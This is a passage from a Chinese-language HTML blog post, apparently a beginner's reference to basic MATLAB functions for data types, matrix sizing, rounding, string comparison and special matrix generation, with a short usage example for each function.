    <content type="html"><![CDATA[<p>MATLAB（矩阵实验室）是第四代高层次的编程语言和交互式环境数值计算，可视化和编程。由美国MathWorks公司开发的一种编程语言。用于算法开发、数据可视化、数据分析以及数值计算的高级技术计算语言和交互式环境，主要包括MATLAB和Simulink两大部分。拥有众多的内置命令和数学函数，可以帮助您在数学计算，绘图和执行数值计算方法。 </p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-class函数"><a href="#1-class函数" class="headerlink" title="1.class函数"></a>1.class函数</h2><blockquote><ol><li>功能</li></ol></blockquote><ul><li>输出变量的类型。</li></ul><blockquote><ol start="2"><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">class(a)<br></code></pre></div></td></tr></table></figure><h2 id="2-single函数"><a href="#2-single函数" class="headerlink" title="2.single函数"></a>2.single函数</h2><blockquote><ol><li>功能</li></ol></blockquote><ul><li>将其他类型的数据转换为单精度类型。</li></ul><blockquote><ol start="2"><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">single(a)<br></code></pre></div></td></tr></table></figure><h2 id="3-double函数"><a href="#3-double函数" class="headerlink" title="3.double函数"></a>3.double函数</h2><blockquote><ol><li>功能</li></ol></blockquote><ul><li>将其他类型的数据转换为双精度类型。</li></ul><blockquote><ol start="2"><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">double(a)<br></code></pre></div></td></tr></table></figure><h2 id="4-获取矩阵行、列数"><a href="#4-获取矩阵行、列数" class="headerlink" title="4.获取矩阵行、列数"></a>4.获取矩阵行、列数</h2><h3 id="4-1-size函数"><a href="#4-1-size函数" class="headerlink" title="4.1 size函数"></a>4.1 size函数</h3><blockquote><ol><li>功能</li></ol></blockquote><ul><li>获取矩阵的行数和列数。</li></ul><blockquote><ol start="2"><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-comment">%方法一</span><br>[m,n]=<span class="hljs-built_in">size</span>(a) <span class="hljs-comment">%m为行数，n为列数</span><br><br><span class="hljs-comment">%方法二</span><br><span class="hljs-built_in">size</span>(a,<span class="hljs-number">1</span>)<span class="hljs-comment">%返回行数</span><br><span class="hljs-built_in">size</span>(a,<span class="hljs-number">2</span>)<span class="hljs-comment">%返回列数</span><br></code></pre></div></td></tr></table></figure><h3 id="4-2-length函数"><a href="#4-2-length函数" class="headerlink" title="4.2 length函数"></a>4.2 length函数</h3><blockquote><ol><li>功能</li></ol></blockquote><ul><li>获取矩阵的行数或列数。</li></ul><blockquote><ol start="2"><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-built_in">length</span>(a) <span class="hljs-comment">%需要注意点是，返回的是行数或列数中的最大值，即：length(a)=max(size(a))。</span><br></code></pre></div></td></tr></table></figure><h2 id="5-求复数实、虚部"><a href="#5-求复数实、虚部" class="headerlink" title="5.求复数实、虚部"></a>5.求复数实、虚部</h2><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">a=<span class="hljs-number">10</span>+<span class="hljs-number">5</span><span class="hljs-built_in">i</span>;<br></code></pre></div></td></tr></table></figure><h3 id="5-1-实部（real函数）"><a href="#5-1-实部（real函数）" class="headerlink" title="5.1 实部（real函数）"></a>5.1 实部（real函数）</h3><blockquote><ol><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-built_in">real</span>(a)<br></code></pre></div></td></tr></table></figure><h3 id="5-2-虚部（imag函数）"><a href="#5-2-虚部（imag函数）" class="headerlink" title="5.2 虚部（imag函数）"></a>5.2 虚部（imag函数）</h3><blockquote><ol><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-built_in">imag</span>(a)<br></code></pre></div></td></tr></table></figure><h2 id="6-输出格式（format）"><a href="#6-输出格式（format）" class="headerlink" title="6.输出格式（format）"></a>6.输出格式（format）</h2><blockquote><ol><li>功能</li></ol></blockquote><ul><li>设置数据的输出格式</li></ul><blockquote><ol start="2"><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">format 格式符<br></code></pre></div></td></tr></table></figure><h2 id="7-sin、sind、abs、char函数"><a href="#7-sin、sind、abs、char函数" class="headerlink" title="7.sin、sind、abs、char函数"></a>7.sin、sind、abs、char函数</h2><blockquote><ol><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-built_in">sin</span>(<span class="hljs-built_in">pi</span>/<span class="hljs-number">2</span>) <span class="hljs-comment">%以弧度为单位</span><br><span class="hljs-built_in">sind</span>(<span class="hljs-number">90</span>) <span class="hljs-comment">%以角度为单位</span><br><br><span class="hljs-comment">%abs函数可以求：实数的绝对值、复数的模、字符串的ASCII码值</span><br><span class="hljs-built_in">abs</span>(<span class="hljs-number">-4</span>)<br><span class="hljs-built_in">abs</span>(<span class="hljs-number">3</span>+<span class="hljs-number">4</span><span class="hljs-built_in">i</span>)<br><span class="hljs-built_in">abs</span>(<span class="hljs-string">&#x27;a&#x27;</span>)<br><br><span class="hljs-comment">%char函数把ASCII码矩阵转换为字符串矩阵</span><br>char(a+<span class="hljs-number">32</span>)<br></code></pre></div></td></tr></table></figure><h2 id="8-取整函数"><a href="#8-取整函数" class="headerlink" title="8.取整函数"></a>8.取整函数</h2><h3 id="8-1-round函数"><a href="#8-1-round函数" class="headerlink" title="8.1 round函数"></a>8.1 round函数</h3><blockquote><ol><li>功能</li></ol></blockquote><ul><li>按照四舍五入的规则取整。</li></ul><blockquote><ol start="2"><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-built_in">round</span>(<span class="hljs-number">4.7</span>) <span class="hljs-comment">%5</span><br></code></pre></div></td></tr></table></figure><h3 id="8-2-ceil函数"><a href="#8-2-ceil函数" class="headerlink" title="8.2 ceil函数"></a>8.2 ceil函数</h3><blockquote><ol><li>功能</li></ol></blockquote><ul><li>向上取整，取大于等于这个数的第一个整数。</li></ul><blockquote><ol start="2"><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-built_in">ceil</span>(<span class="hljs-number">-3.8</span>) <span class="hljs-comment">%-3</span><br></code></pre></div></td></tr></table></figure><h3 id="8-3-floor函数"><a href="#8-3-floor函数" class="headerlink" title="8.3 floor函数"></a>8.3 floor函数</h3><blockquote><ol><li>功能</li></ol></blockquote><ul><li>向下取整，取小于等于这个数的第一个整数。</li></ul><blockquote><ol start="2"><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-built_in">floor</span>(<span class="hljs-number">3.6</span>) <span class="hljs-comment">%3</span><br></code></pre></div></td></tr></table></figure><h3 id="8-4-fix函数"><a href="#8-4-fix函数" class="headerlink" title="8.4 fix函数"></a>8.4 fix函数</h3><blockquote><ol><li>功能</li></ol></blockquote><ul><li>固定取靠近0的那个整数，即舍去小数取整。</li></ul><blockquote><ol start="2"><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-built_in">fix</span>(<span class="hljs-number">-3.2</span>) <span class="hljs-comment">%-3</span><br></code></pre></div></td></tr></table></figure><h2 id="9-取余数（rem函数）"><a href="#9-取余数（rem函数）" class="headerlink" title="9.取余数（rem函数）"></a>9.取余数（rem函数）</h2><blockquote><ol><li>功能</li></ol></blockquote><ul><li>求m/n的余数</li></ul><blockquote><ol start="2"><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-built_in">rem</span>(m,n) <span class="hljs-comment">%求m/n的余数</span><br></code></pre></div></td></tr></table></figure><h2 id="10-判断素数（isprime函数）"><a href="#10-判断素数（isprime函数）" class="headerlink" title="10.判断素数（isprime函数）"></a>10.判断素数（isprime函数）</h2><blockquote><ol><li>功能</li></ol></blockquote><ul><li>判断是否为素数，是则返回1，否则返回0。</li></ul><blockquote><ol start="2"><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-built_in">isprime</span>(n) <span class="hljs-comment">%判断 n 是否为素数</span><br></code></pre></div></td></tr></table></figure><h2 id="11-查找（find函数）-amp"><a href="#11-查找（find函数）-amp" class="headerlink" title="11.查找（find函数）&amp;*"></a>11.查找（find函数）&amp;*</h2><blockquote><ol><li>功能</li></ol></blockquote><ul><li>查找指定值，返回索引。</li></ul><blockquote><ol start="2"><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">k=<span class="hljs-built_in">find</span>(<span class="hljs-built_in">j</span>)<br></code></pre></div></td></tr></table></figure><h2 id="12-产生行向量（linspace函数）"><a href="#12-产生行向量（linspace函数）" class="headerlink" title="12.产生行向量（linspace函数）"></a>12.产生行向量（linspace函数）</h2><blockquote><ol><li>功能</li></ol></blockquote><ul><li>在给定范围了，产生具有相同距离的n个数据。如省略n，自动产生100个元素。</li></ul><blockquote><ol start="2"><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-built_in">linspace</span>(a,b,n) <span class="hljs-comment">%a为一个元素，b为最后一个元素，n为元素的总数</span><br></code></pre></div></td></tr></table></figure><h2 id="13-元素的引用"><a href="#13-元素的引用" class="headerlink" title="13.元素的引用"></a>13.元素的引用</h2><p>矩阵中，序号与下标是一一对应的，以m * n矩阵A为例，矩阵元素 A(i,j)的序号为 (j-1) * m+i 。</p><h3 id="13-1-sub2ind函数"><a href="#13-1-sub2ind函数" class="headerlink" title="13.1 sub2ind函数"></a>13.1 sub2ind函数</h3><blockquote><ol><li>功能</li></ol></blockquote><ul><li>将矩阵中指定元素的行、列下标转换成存储的序号。</li></ul><blockquote><ol start="2"><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">D=<span class="hljs-built_in">sub2ind</span>(S,I,J) <br><span class="hljs-comment">%D为序号，即最后得到的序号</span><br><span class="hljs-comment">%S为由行数和列数组成的向量</span><br><span class="hljs-comment">%I为转换矩阵元素的行下标</span><br><span class="hljs-comment">%J为转换矩阵元素的列下标。</span><br></code></pre></div></td></tr></table></figure><h3 id="13-2-ind2sub函数"><a href="#13-2-ind2sub函数" class="headerlink" title="13.2 ind2sub函数"></a>13.2 ind2sub函数</h3><blockquote><ol><li>功能</li></ol></blockquote><ul><li>将把矩阵元素的序号转换成对应的下标。</li></ul><blockquote><ol start="2"><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">[I,J]=<span class="hljs-built_in">ind2sub</span>(S,D)<br><span class="hljs-comment">%I为行下标</span><br><span class="hljs-comment">%J为列下标</span><br><span class="hljs-comment">%S为行数和列数组成的向量</span><br><span class="hljs-comment">%D为序号</span><br></code></pre></div></td></tr></table></figure><h2 id="14-改变矩阵形状（reshape函数）"><a href="#14-改变矩阵形状（reshape函数）" class="headerlink" title="14.改变矩阵形状（reshape函数）"></a>14.改变矩阵形状（reshape函数）</h2><blockquote><ol><li>功能</li></ol></blockquote><ul><li>在矩阵总元素保持不变的前提下，将矩阵A重新排成 m * n 的二维矩阵。reshape函数只是改变原矩阵的行数和列数，但并不改变原矩阵元素个数及其存储顺序。</li></ul><blockquote><ol start="2"><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-built_in">reshape</span>(A,m,n)<br></code></pre></div></td></tr></table></figure><ul><li>A(:)等价于reshape(A,n,1)。</li></ul><h2 id="15-字符串比较函数"><a href="#15-字符串比较函数" class="headerlink" title="15.字符串比较函数"></a>15.字符串比较函数</h2><h3 id="15-1-strcmp函数"><a href="#15-1-strcmp函数" class="headerlink" title="15.1 strcmp函数"></a>15.1 strcmp函数</h3><blockquote><ol><li>功能</li></ol></blockquote><ul><li>比较两个字符串是否相等，如果相等，返回1；否则返回0。</li></ul><blockquote><ol start="2"><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">strcmp(s1,s2)<br></code></pre></div></td></tr></table></figure><h3 id="15-2-strncmp函数"><a href="#15-2-strncmp函数" class="headerlink" title="15.2 strncmp函数"></a>15.2 strncmp函数</h3><blockquote><ol><li>功能</li></ol></blockquote><ul><li>比较两个字符串前n个字符是否相等，如果相等，返回1；否则返回0。</li></ul><blockquote><ol start="2"><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">strncmp(s1,s2,n)<br></code></pre></div></td></tr></table></figure><h3 id="15-3-strcmpi函数"><a href="#15-3-strcmpi函数" class="headerlink" title="15.3 strcmpi函数"></a>15.3 strcmpi函数</h3><blockquote><ol><li>功能</li></ol></blockquote><ul><li>这忽略字母大小写前提下，比较字符串是否相等，如果相等，返回1；否则返回0。</li></ul><blockquote><ol start="2"><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">strcmpi(s1,s2)<br></code></pre></div></td></tr></table></figure><h3 id="15-4-strncmpi函数"><a href="#15-4-strncmpi函数" class="headerlink" title="15.4 strncmpi函数"></a>15.4 strncmpi函数</h3><blockquote><ol><li>功能</li></ol></blockquote><ul><li>这忽略字符串大小写前提下，比较两个字符串前n个字符是否相等，如果相等，返回1；否则返回0。</li></ul><blockquote><ol start="2"><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">strncmpi(s1,s2,n)<br></code></pre></div></td></tr></table></figure><h2 id="16-字符串的查找、替换函数"><a href="#16-字符串的查找、替换函数" class="headerlink" title="16.字符串的查找、替换函数"></a>16.字符串的查找、替换函数</h2><h3 id="16-1-findstr函数"><a href="#16-1-findstr函数" class="headerlink" title="16.1 findstr函数"></a>16.1 findstr函数</h3><blockquote><ol><li>功能</li></ol></blockquote><ul><li>返回短字符串在长字符串中的开始位置。不分先后位置。</li></ul><blockquote><ol start="2"><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">findstr(s1,s2)<br></code></pre></div></td></tr></table></figure><h3 id="16-2-strrep函数"><a href="#16-2-strrep函数" class="headerlink" title="16.2 strrep函数"></a>16.2 strrep函数</h3><blockquote><ol><li>功能</li></ol></blockquote><ul><li>将字符串s1中的所有子字符串s2替换为字符串s3。</li></ul><blockquote><ol start="2"><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">strrep(s1,s2,s3)<br></code></pre></div></td></tr></table></figure><h2 id="17-将字符串作为命令执行（eval函数）"><a href="#17-将字符串作为命令执行（eval函数）" class="headerlink" title="17.将字符串作为命令执行（eval函数）"></a>17.将字符串作为命令执行（eval函数）</h2><blockquote><ol><li>功能</li></ol></blockquote><ul><li>将字符串内容作为Matlab命令执行。</li></ul><blockquote><ol start="2"><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">eval(a) <span class="hljs-comment">%a为带命令的字符串</span><br></code></pre></div></td></tr></table></figure><h2 id="18-判断整数（isinteger函数）"><a href="#18-判断整数（isinteger函数）" class="headerlink" title="18.判断整数（isinteger函数）"></a>18.判断整数（isinteger函数）</h2><blockquote><ol><li>功能</li></ol></blockquote><ul><li>验证变量是否为整数。</li></ul><blockquote><ol start="2"><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">isinteger(x)<br></code></pre></div></td></tr></table></figure><h2 id="19-通用矩阵"><a href="#19-通用矩阵" class="headerlink" title="19.通用矩阵"></a>19.通用矩阵</h2><h3 id="19-1-零矩阵（zeros函数）"><a href="#19-1-零矩阵（zeros函数）" class="headerlink" title="19.1 零矩阵（zeros函数）"></a>19.1 零矩阵（zeros函数）</h3><blockquote><ol><li>功能</li></ol></blockquote><ul><li>产生全零矩阵，即零矩阵。</li></ul><blockquote><ol start="2"><li>使用方式</li></ol></blockquote><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matalb">zeros(m) %产生m * m 零矩阵<br>zeros(m,n) %产生m * n 零矩阵<br>zeros(size(a)) %产生与矩阵a同样大小的零矩阵<br></code></pre></div></td></tr></table></figure><h3 id="19-2-幺矩阵（ones函数）"><a href="#19-2-幺矩阵（ones函数）" class="headerlink" title="19.2 幺矩阵（ones函数）"></a>19.2 幺矩阵（ones函数）</h3><blockquote><ol><li>功能</li></ol></blockquote><ul><li>产生全1矩阵。即幺矩阵。</li></ul><blockquote><ol start="2"><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">同<span class="hljs-built_in">zeros</span>函数用法相同。具体用法见<span class="hljs-built_in">zeros</span>函数。<br></code></pre></div></td></tr></table></figure><h3 id="19-3-对角线为1（eye函数）"><a href="#19-3-对角线为1（eye函数）" class="headerlink" title="19.3 对角线为1（eye函数）"></a>19.3 对角线为1（eye函数）</h3><blockquote><ol><li>功能</li></ol></blockquote><ul><li>产生对角线为1的矩阵。当矩阵是方阵时，得到一个单位矩阵。</li></ul><blockquote><ol start="2"><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">同<span class="hljs-built_in">zeros</span>函数用法相同。具体用法见<span class="hljs-built_in">zeros</span>函数。<br></code></pre></div></td></tr></table></figure><h3 id="19-4-随机矩阵（rand函数）"><a href="#19-4-随机矩阵（rand函数）" class="headerlink" title="19.4 随机矩阵（rand函数）"></a>19.4 随机矩阵（rand函数）</h3><blockquote><ol><li>功能</li></ol></blockquote><ul><li>产生（0，1）区间均匀分布的随机矩阵。</li></ul><blockquote><ol start="2"><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">同<span class="hljs-built_in">zeros</span>函数用法相同。具体用法见<span class="hljs-built_in">zeros</span>函数。<br></code></pre></div></td></tr></table></figure><h3 id="19-5-标准正态分布随机矩阵（randn函数）"><a href="#19-5-标准正态分布随机矩阵（randn函数）" class="headerlink" title="19.5 标准正态分布随机矩阵（randn函数）"></a>19.5 标准正态分布随机矩阵（randn函数）</h3><blockquote><ol><li>功能</li></ol></blockquote><ul><li>产生均值为0，方差为1的标准正态分布随机矩阵。</li></ul><blockquote><ol start="2"><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">同<span class="hljs-built_in">zeros</span>函数用法相同。具体用法见<span class="hljs-built_in">zeros</span>函数。<br><br><span class="hljs-comment">%产生均值为0.6、方差为0.1的5阶正态分布随机矩阵。</span><br>B=<span class="hljs-number">0.6</span>+<span class="hljs-built_in">sqrt</span>(<span class="hljs-number">0.1</span>)*<span class="hljs-built_in">randn</span>(<span class="hljs-number">5</span>)<br></code></pre></div></td></tr></table></figure><h2 id="20-特殊矩阵"><a href="#20-特殊矩阵" class="headerlink" title="20.特殊矩阵"></a>20.特殊矩阵</h2><h3 id="20-1-魔方矩阵（magic函数）"><a href="#20-1-魔方矩阵（magic函数）" class="headerlink" title="20.1 魔方矩阵（magic函数）"></a>20.1 魔方矩阵（magic函数）</h3><blockquote><ol><li>功能</li></ol></blockquote><ul><li>产生一个特定的魔方阵。</li></ul><blockquote><ol start="2"><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-built_in">magic</span>(n)  <span class="hljs-comment">%n阶</span><br></code></pre></div></td></tr></table></figure><h3 id="20-2-范德蒙矩阵（vander函数）"><a href="#20-2-范德蒙矩阵（vander函数）" class="headerlink" title="20.2 范德蒙矩阵（vander函数）"></a>20.2 范德蒙矩阵（vander函数）</h3><blockquote><ol><li>功能</li></ol></blockquote><ul><li>生成以v为基础的范德蒙矩阵。</li></ul><blockquote><ol start="2"><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-built_in">vander</span>(v)<br><br><span class="hljs-comment">%实例</span><br><span class="hljs-built_in">vander</span>(<span class="hljs-number">1</span>:<span class="hljs-number">5</span>)<br></code></pre></div></td></tr></table></figure><h3 id="20-3-希尔伯特矩阵（hilb函数）"><a href="#20-3-希尔伯特矩阵（hilb函数）" class="headerlink" title="20.3 希尔伯特矩阵（hilb函数）"></a>20.3 希尔伯特矩阵（hilb函数）</h3><blockquote><ol><li>功能</li></ol></blockquote><ul><li>生成n阶希尔伯特矩阵函数。</li></ul><blockquote><ol start="2"><li>使用方式</li></ol></blockquote><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matalb">hilb(n)<br></code></pre></div></td></tr></table></figure><h3 id="20-4-伴随矩阵（compan函数）"><a href="#20-4-伴随矩阵（compan函数）" class="headerlink" title="20.4 伴随矩阵（compan函数）"></a>20.4 伴随矩阵（compan函数）</h3><blockquote><ol><li>功能</li></ol></blockquote><ul><li>生成伴随矩阵。其中p是一个多项式的系数向量，高次幂系数排在前，低次幂系数排在后。</li></ul><blockquote><ol start="2"><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-built_in">compan</span>(p)<br><br><span class="hljs-comment">%实例</span><br>p=[<span class="hljs-number">1</span>,<span class="hljs-number">-2</span>,<span class="hljs-number">-5</span>,<span class="hljs-number">6</span>]<br><span class="hljs-built_in">compan</span>(p)<br></code></pre></div></td></tr></table></figure><h3 id="20-5-帕斯卡矩阵（pascal函数）"><a href="#20-5-帕斯卡矩阵（pascal函数）" class="headerlink" title="20.5 帕斯卡矩阵（pascal函数）"></a>20.5 帕斯卡矩阵（pascal函数）</h3><blockquote><ol><li>功能</li></ol></blockquote><ul><li>生成一个n阶帕斯卡矩阵。</li></ul><blockquote><ol start="2"><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-built_in">pascal</span>(n)<br></code></pre></div></td></tr></table></figure><h2 id="21-对角阵"><a href="#21-对角阵" class="headerlink" title="21.对角阵"></a>21.对角阵</h2><ul><li><p>对角矩阵：只有对角线上有非零元素的矩阵。</p></li><li><p>数量矩阵：对角线上的元素相等的对角矩阵。</p></li><li><p>单位矩阵：对角线上的元素都为1的对角矩阵。</p></li></ul><h3 id="21-1-提取矩阵的对角线元素"><a href="#21-1-提取矩阵的对角线元素" class="headerlink" title="21.1 提取矩阵的对角线元素"></a>21.1 提取矩阵的对角线元素</h3><h4 id="21-1-1-提取主对角线元素（diag函数）"><a href="#21-1-1-提取主对角线元素（diag函数）" class="headerlink" title="21.1.1 提取主对角线元素（diag函数）"></a>21.1.1 提取主对角线元素（diag函数）</h4><blockquote><ol><li>功能</li></ol></blockquote><ul><li>提取矩阵对角线元素，产生一个列向量。</li></ul><blockquote><ol start="2"><li>使用方式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-built_in">diag</span>(a) <span class="hljs-comment">%提取矩阵a主对角线元素，产生一个列向量。</span><br><br><span class="hljs-built_in">diag</span>(a,k) <span class="hljs-comment">%提取矩阵a第k条对角线元素，产生一个列向量。</span><br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210717091521996.png"></p><h2 id="22-三角阵"><a href="#22-三角阵" class="headerlink" title="22.三角阵"></a>22.三角阵</h2><h3 id="22-1-上三角矩阵"><a href="#22-1-上三角矩阵" class="headerlink" title="22.1 上三角矩阵"></a>22.1 上三角矩阵</h3><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs 